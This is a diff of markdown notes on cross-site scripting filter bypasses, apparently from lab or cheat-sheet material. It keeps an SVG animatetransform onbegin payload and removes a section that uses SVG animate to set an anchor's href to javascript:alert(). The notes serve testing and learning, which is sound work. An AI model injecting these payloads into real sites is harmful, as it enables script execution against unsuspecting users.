@@ -133,18 +133,6 @@ this should trigger the alert function
 
 `/?search=<svg><animatetransform%20onbegin="alert()">`
 
-## href blocked on a tag
-
-> `svg` -> `animate` acceptable and `animate` can set parent element attribute
-
-`/?search=<svg><a><animate attributeName="href" values="javascript:alert()" /></a></svg>`
-
-- this tells to the `a` tag to have the `href="javascript:alert()"` attribute-value
-
-> now just give a text to the anchor tag with `text` tag
-
-`<svg><a><animate attributeName="href" values="javascript:alert()" /><text x=20 y=20>Click me</text></a></svg>`
-
 ## canonical link tag
 
 > if the url content reflected in the link tag in the head, that can be useful
